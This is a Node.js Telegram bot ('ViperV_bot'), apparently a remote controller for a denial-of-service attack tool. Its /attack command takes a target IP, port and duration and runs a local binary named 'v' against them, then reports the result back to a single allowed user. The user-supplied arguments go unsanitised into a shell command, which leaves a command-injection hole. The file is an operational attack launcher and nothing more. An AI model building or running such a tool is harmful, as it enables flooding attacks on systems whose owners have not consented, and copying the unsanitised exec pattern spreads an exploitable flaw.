const { Telegraf } = require('telegraf');
const { exec } = require('child_process');
const fs = require('fs').promises;
const path = require('path');

const bot = new Telegraf(process.env.BOT_TOKEN);
const BINARY_PATH = path.join(__dirname, 'v');
const ALLOWED_USER_ID = '8743980380';

(async () => {
  try {
    await fs.chmod(BINARY_PATH, '755');
    console.log('✅ Binary ready');
  } catch (err) {
    console.error('❌ Binary not found');
  }
})();

bot.command('attack', async (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  
  const args = ctx.message.text.split(' ');
  if (args.length < 4) {
    return ctx.reply('Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 192.168.1.1 80 60');
  }
  
  const ip = args[1];
  const port = args[2];
  const duration = args[3];
  
  const command = `${BINARY_PATH} ${ip} ${port} ${duration}`;
  
  await ctx.reply(`🎯 Attacking ${ip}:${port} for ${duration}s`);
  
  exec(command, { timeout: duration * 1000 + 5000 }, (error, stdout, stderr) => {
    const output = stdout || stderr || error?.message || 'Completed';
    ctx.reply(`✅ Result:\n${output.slice(0, 4000)}`);
  });
});

bot.command('status', async (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  
  try {
    const stats = await fs.stat(BINARY_PATH);
    ctx.reply(`✅ Binary ready\nSize: ${(stats.size / 1024).toFixed(2)} KB`);
  } catch {
    ctx.reply('❌ Binary file "v" not found');
  }
});

bot.command('start', (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  ctx.reply('🔷 ViperV_bot ready!\nUse /attack <IP> <PORT> <DURATION>');
});

bot.launch();
console.log('ViperV_bot started');
